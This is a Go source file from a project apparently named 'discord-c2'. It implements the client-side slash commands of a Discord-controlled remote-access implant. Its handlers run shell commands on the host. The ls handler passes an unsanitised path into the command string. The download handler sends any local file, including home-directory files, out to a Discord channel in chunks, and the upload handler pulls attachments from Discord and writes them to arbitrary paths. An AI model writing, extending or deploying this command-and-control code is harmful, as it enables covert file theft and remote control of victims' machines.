package commands

// This file contains filesystem-related slash commands such as cwd, ls,
// download, and upload.

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"discord-c2/internal/httpx"
	"discord-c2/internal/shell"
	"discord-c2/internal/transfer"

	"github.com/bwmarrin/discordgo"
)

var transferChunkSize int64 = transfer.DefaultChunkSize

// SetTransferChunkSize configures the split size for large downloads.
func SetTransferChunkSize(n int64) {
	if n > 0 {
		transferChunkSize = n
	}
}

// handleSlashCwd runs a platform-appropriate command to show the current
// working directory for this client.
func handleSlashCwd(s *discordgo.Session, i *discordgo.InteractionCreate) {
	cmd := "pwd"
	if runtime.GOOS == "windows" {
		cmd = "cd"
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Running: `" + cmd + "`",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	shell.Run(s, i.ChannelID, nil, cmd)
}

// handleSlashLs lists a directory on the client, defaulting to the current
// working directory when no path is provided.
func handleSlashLs(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var path string
	for _, opt := range data.Options {
		if opt.Name == "path" {
			path = opt.StringValue()
			break
		}
	}
	base := "ls"
	if runtime.GOOS == "windows" {
		base = "dir"
	}
	cmdStr := base
	if path != "" {
		cmdStr = base + " " + path
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Running: `" + cmdStr + "`",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	shell.Run(s, i.ChannelID, nil, cmdStr)
}

// handleSlashDownload sends a local file to Discord. Files larger than the
// configured chunk size are split into parts with a manifest.
func handleSlashDownload(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var srcPath string
	for _, opt := range data.Options {
		if opt.Name == "source" {
			srcPath = opt.StringValue()
		}
	}
	if srcPath == "" {
		respondEphemeral(s, i, "No source path provided.")
		return
	}
	if strings.HasPrefix(srcPath, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			srcPath = home + string(os.PathSeparator) + srcPath[2:]
		}
	}
	fi, err := os.Stat(srcPath)
	if err != nil {
		respondEphemeral(s, i, "Cannot read file: "+srcPath+" ("+err.Error()+")")
		return
	}
	if fi.IsDir() {
		respondEphemeral(s, i, srcPath+" is a directory.")
		return
	}

	respondEphemeral(s, i, "📥 Downloading `"+filepath.Base(srcPath)+"` ("+humanSize(fi.Size())+")...")
	if err := transfer.Send(s, i.ChannelID, nil, srcPath, transferChunkSize); err != nil {
		s.ChannelMessageSend(i.ChannelID, "Download failed: "+err.Error())
	}
}

func humanSize(n int64) string {
	const unit = 1024
	if n < unit {
		return fmt.Sprintf("%d B", n)
	}
	div, exp := int64(unit), 0
	for v := n / unit; v >= unit; v /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(n)/float64(div), "KMGTPE"[exp])
}

// handleSlashUpload downloads an attachment from Discord and writes it to a
// destination path on the client, expanding ~/ when present.
func handleSlashUpload(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var destPath string
	var attachment *discordgo.MessageAttachment
	for _, opt := range data.Options {
		if opt.Name == "destination" {
			destPath = opt.StringValue()
		}
		if opt.Name == "source" {
			if data.Resolved != nil && data.Resolved.Attachments != nil {
				if id, ok := opt.Value.(string); ok {
					if a, ok := data.Resolved.Attachments[id]; ok {
						attachment = a
					}
				}
			}
		}
	}
	if destPath == "" || attachment == nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Source attachment and destination path are required.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	if strings.HasPrefix(destPath, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			destPath = home + string(os.PathSeparator) + destPath[2:]
		}
	}
	if info, err := os.Stat(destPath); err == nil && info.IsDir() {
		destPath = filepath.Join(destPath, attachment.Filename)
	}
	out, err := os.Create(destPath)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Cannot create file: " + destPath + " (" + err.Error() + ")",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	defer out.Close()
	resp, err := httpx.Client.Get(attachment.URL)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Download failed: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	defer resp.Body.Close()
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Write failed: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "☝️ Uploaded file to " + destPath,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}
